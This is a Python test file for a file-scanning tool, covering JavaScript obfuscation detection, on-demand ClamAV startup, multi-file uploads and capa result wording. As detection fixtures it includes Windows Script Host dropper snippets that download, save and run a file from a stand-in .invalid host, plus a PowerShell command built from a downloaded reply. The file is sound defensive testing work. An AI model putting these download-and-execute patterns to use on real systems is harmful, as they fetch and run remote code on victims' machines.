"""The rest of round 2's fixes: minified vs. obfuscated JavaScript, ClamAV only while it is needed, several dropped
files at once, and the capa line naming the weak sign that made a program Unusual."""

import os
import tempfile
import threading
import time
import unittest
from pathlib import Path
from unittest import mock

from blotter import clamav
from blotter.analyze import scripts
from blotter.cache import Cache
from blotter.checks import archive, capabilities
from blotter.checks import clamav as clamav_check
from blotter.findings import CLEAR, NOTE, UNSIGNED, Finding
from blotter.runner import Runner
from blotter.verdict import decide
from tests.test_runner_app import copy_file, fake_check, wait_done
from tests.test_session import STATIC, client_for, make_app

# A folder of real web-app zips (minified JavaScript) that round 2 called Suspicious. Set BLOTTER_TEST_WEBAPP_ZIPS to it
# to run test_real_web_app_zips; without it the test is skipped.
WEBAPP_ZIPS = os.environ.get("BLOTTER_TEST_WEBAPP_ZIPS")


def js(text):
    return {f.details.get("ability"): f for f in scripts.analyze_text("scripts", text, "js")}


# What bundlers ship: one long line, one-letter names, RegExp .exec(), String.fromCharCode(), an old Internet
# Explorer XMLHTTP fallback, unescape(), split/reverse/join on a variable, a base64 picture decoded with atob().
MINIFIED = ('!function(e,t){"use strict";var n=/^[a-z]+$/i.exec(t),r=String.fromCharCode(e.charCodeAt(0)+1);'
            'function o(){try{return new XMLHttpRequest}catch(t){return new ActiveXObject("MSXML2.XMLHTTP")}}'
            'var i=unescape(encodeURIComponent(r)),a=t.split("").reverse().join(""),s=eval,'
            'u="data:image/png;base64,' + "iVBORw0KGgo" * 60 + '",c=atob(u.slice(22));'
            'e.lib={n:n,r:r,o:o,i:i,a:a,s:s,c:c}}(this,"abc");') * 40


class MinifiedJavaScriptTests(unittest.TestCase):
    def test_plain_minification_is_not_a_warning_sign(self):
        self.assertGreater(max(map(len, MINIFIED.splitlines())), 10_000)
        self.assertEqual(js(MINIFIED), {})
        # A code highlighter's list of language names next to the old XMLHTTP fallback
        languages = ('var L=["bash","powershell","vbscript","cmd"];'
                     'function o(){try{return new XMLHttpRequest}catch(t){return new ActiveXObject("MSXML2.XMLHTTP")}}'
                     'var x=o();')
        self.assertEqual(js(languages), {})
        self.assertIn("download-run", js(languages + 'x.open("GET","https://blotter-test.invalid/");'
                                                     'var p="powershell.exe -nop -c "+x.responseText;'
                                                     'new ActiveXObject("ADODB.Stream").SaveToFile(p)'))

    def test_obfuscator_names(self):
        names = ";".join(f"var _0x{n:04x}=_0x3f2a[{n}]" for n in range(12))
        found = js("var _0x3f2a=['log','Hello'];" + names + ";console[_0x0000](_0x0001);")
        self.assertIn("_0x names", found["obfuscation"].details["tricks"])

    def test_big_string_list_fed_into_eval_or_function(self):
        words = ",".join(f"'p{n}'" for n in range(60))
        self.assertIn("string list fed into eval/Function",
                      js(f"var w=[{words}];eval(w[3]+w[9]);")["obfuscation"].details["tricks"])
        self.assertIn("string list fed into eval/Function",
                      js(f"const w=[{words}];new Function(w[1])();")["obfuscation"].details["tricks"])
        self.assertEqual(js(f"var w=[{words}];console.log(w[3]);eval('1+1');"), {})  # the list isn't fed in

    def test_packer_and_eval_of_decoded_text(self):
        packed = "eval(function(p,a,c,k,e,d){e=function(c){return c};return p}('0 1',2,2,'x|y'.split('|'),0,{}))"
        self.assertIn("packer", js(packed)["obfuscation"].details["tricks"])
        self.assertIn("eval of decoded text", js('eval(atob("Y29uc29sZS5sb2coMSk="))')["obfuscation"].details["tricks"])
        codes = "String.fromCharCode(" + ",".join(str(70 + n) for n in range(15)) + ")"
        self.assertIn("char codes", js(f"var s={codes};")["obfuscation"].details["tricks"])

    def test_script_host_downloaders_still_count(self):
        # A Windows Script Host .js (what runs when one is double-clicked) that downloads, saves and starts a file.
        # The address ends in .invalid, a name that can never exist; nothing here runs it.
        dropper = ('var h=new ActiveXObject("MSXML2.XMLHTTP");h.open("GET","https://blotter-test.invalid/a.bin",false);'
                   'h.send();var s=new ActiveXObject("ADODB.Stream");s.Open();s.Type=1;s.Write(h.responseBody);'
                   's.SaveToFile("a.bin",2);new ActiveXObject("WScript" + ".Shell").Run("a.bin");')
        self.assertIn("download-run", js(dropper.replace('"WScript" + ".Shell"', '"WScript.Shell"')))
        self.assertIn("download", js(dropper.split("new ActiveXObject(\"WScript")[0]))  # saved, not started
        runs_reply = 'var x=new ActiveXObject("MSXML2.XMLHTTP");x.open("GET","https://blotter-test.invalid/");' \
                     'x.send();eval(x.responseText);'
        self.assertIn("download-run", js(runs_reply))

    def test_powershell_keeps_its_own_patterns(self):
        found = scripts.analyze_text("scripts", "$a = [char]72+[char]101+[char]108+[char]108+[char]111+[char]33+[char]33",
                                     "ps1")
        self.assertIn("char codes", found[0].details["tricks"])

    def test_real_web_app_zips(self):
        present = sorted(Path(WEBAPP_ZIPS).rglob("*.zip"))[:20] if WEBAPP_ZIPS else []
        if not present:
            self.skipTest("BLOTTER_TEST_WEBAPP_ZIPS isn't set to a folder with zips")
        for path in present:
            v = decide([Finding("filetype", CLEAR, "A zip."), *archive.scan(path)])
            self.assertEqual(v["verdict"], "no_known_detections", (path.name, v["reasons"][:4]))


class FakeClamd:
    def __init__(self):
        self.launches = 0
        self.closed = 0

    def launch(self, service):
        self.launches += 1
        job = mock.Mock()
        job.close.side_effect = lambda: setattr(self, "closed", self.closed + 1)
        with service._lock:
            service._job, service._proc = job, mock.Mock(poll=lambda: None)
        service._set("ready", "ClamAV (test)")


class ClamAVOnDemandTests(unittest.TestCase):
    def setUp(self):
        self.clamd = FakeClamd()
        state = Path(tempfile.mkdtemp()) / "clamav-state.json"
        for patch in (mock.patch.object(clamav, "STATE_FILE", state),
                      mock.patch.object(clamav, "IDLE_STOP", 0.4), mock.patch.object(clamav, "TICK", 0.05),
                      mock.patch.object(clamav, "installed", return_value=True),
                      mock.patch.object(clamav, "has_signatures", return_value=True),
                      mock.patch.object(clamav, "signatures_age", return_value=0),
                      mock.patch.object(clamav.settings, "load", return_value={"clamav": True}),
                      mock.patch.object(clamav.Service, "_launch", lambda svc: self.clamd.launch(svc))):
            patch.start()
            self.addCleanup(patch.stop)
        self.service = clamav.Service()
        self.addCleanup(self.service.stop, "stopped")

    def wait(self, state, seconds=3):
        end = time.monotonic() + seconds
        while self.service.state != state and time.monotonic() < end:
            time.sleep(0.02)
        return self.service.state

    def test_blotter_starting_doesnt_load_clamd(self):
        self.service.start()
        self.assertEqual(self.wait("sleeping"), "sleeping")
        self.assertEqual(self.clamd.launches, 0)
        self.assertEqual(clamav.read_state()["state"], "sleeping")

    def test_first_check_starts_it_and_ten_idle_minutes_stop_it(self):
        self.service.wake()
        self.assertEqual(clamav.read_state()["state"] in ("starting", "ready"), True)  # never "stopped" meanwhile
        self.assertEqual(self.wait("ready"), "ready")
        self.service.release()
        self.assertEqual(self.wait("sleeping"), "sleeping")
        self.assertEqual((self.clamd.launches, self.clamd.closed), (1, 1))
        self.service.wake()  # the next check starts it again
        self.assertEqual(self.wait("ready"), "ready")
        self.assertEqual(self.clamd.launches, 2)
        self.service.release()

    def test_it_doesnt_rest_while_a_check_uses_it(self):
        self.service.wake()
        self.wait("ready")
        time.sleep(0.8)  # twice the (shortened) idle time
        self.assertEqual(self.service.state, "ready")
        self.service.release()
        self.assertEqual(self.wait("sleeping"), "sleeping")

    def test_turned_off_means_no_start(self):
        with mock.patch.object(clamav.settings, "load", return_value={"clamav": False}):
            self.service.wake()
            self.assertEqual(self.wait("off"), "off")
        self.assertEqual(self.clamd.launches, 0)
        self.service.release()

    def test_the_clamav_check_wakes_it_from_blotter_itself(self):
        with mock.patch.object(clamav, "service") as service:
            done = clamav_check.prepare()
            service.wake.assert_called_once()
            self.assertIs(done, service.release)
        self.assertNotIn("sleeping", ("failed", "off", "not_installed", "stopped"))  # the check waits while it rests

    def test_runner_calls_prepare_and_its_release_around_a_check(self):
        calls = []
        check = fake_check("p")
        check.prepare = lambda: calls.append("prepare") or (lambda: calls.append("release"))
        job = wait_done(Runner(Cache(Path(tempfile.mkdtemp()) / "c.sqlite3"), [check]).start(
            copy_file(), "a.txt", 4, "0" * 64))
        self.assertEqual(job.state, "done")
        self.assertEqual(calls, ["prepare", "release"])


class SeveralFilesTests(unittest.TestCase):
    def test_five_uploads_are_five_jobs_in_the_list(self):
        client = client_for(make_app(checks=[fake_check("fast", delay=0.2)]))
        ids = [client.post("/api/scan", content=f"file {n}".encode(), headers={"X-File-Name": f"drop-{n}.txt"}).json()["id"]
               for n in range(5)]
        jobs = client.get("/api/jobs").json()["jobs"]
        self.assertEqual([j["id"] for j in jobs], ids[::-1])
        self.assertEqual([j["name"] for j in jobs], [f"drop-{n}.txt" for n in reversed(range(5))])

    def test_the_page_sends_every_dropped_or_chosen_file(self):
        page = (STATIC / "index.html").read_text(encoding="utf-8")
        code = (STATIC / "app.js").read_text(encoding="utf-8")
        self.assertIn('type="file" multiple', page)
        self.assertNotIn("dataTransfer.files[0]", code)  # round 2: only the first dropped file was sent
        self.assertNotIn("picker.files[0]", code)
        self.assertIn("scanFiles(files)", code)
        self.assertIn("scanFiles([...picker.files])", code)
        self.assertNotIn("innerHTML", code)


def capa_result(*names):
    namespaces = {"check for credit card number": "collection/credit-card",
                  "contain obfuscated stackstrings": "anti-analysis/obfuscation/string/stackstring",
                  "read file": "host-interaction/file-system/read"}
    return {"rules": {n: {"meta": {"namespace": namespaces[n]}} for n in names}}


class WeakSignWordingTests(unittest.TestCase):
    def test_unusual_from_a_weak_sign_names_it(self):
        found = capabilities.interpret(capa_result("check for credit card number", "read file"))
        unsigned = Finding("signature", NOTE, "It isn't digitally signed.", {}, [UNSIGNED])
        v = decide([unsigned, *found])
        self.assertEqual(v["verdict"], "unusual")
        text = " ".join(v["reasons"])
        self.assertNotIn("none of the risky ones", text)
        self.assertIn("capa found 2 abilities, including a weak sign that counts here: it checks card-like numbers.",
                      v["reasons"])

    def test_when_the_weak_sign_doesnt_count_the_line_stays(self):
        found = capabilities.interpret(capa_result("check for credit card number", "read file"))
        v = decide(found)
        self.assertEqual(v["verdict"], "no_known_detections")
        self.assertNotIn("weak sign", " ".join(v["reasons"]))


if __name__ == "__main__":
    unittest.main()
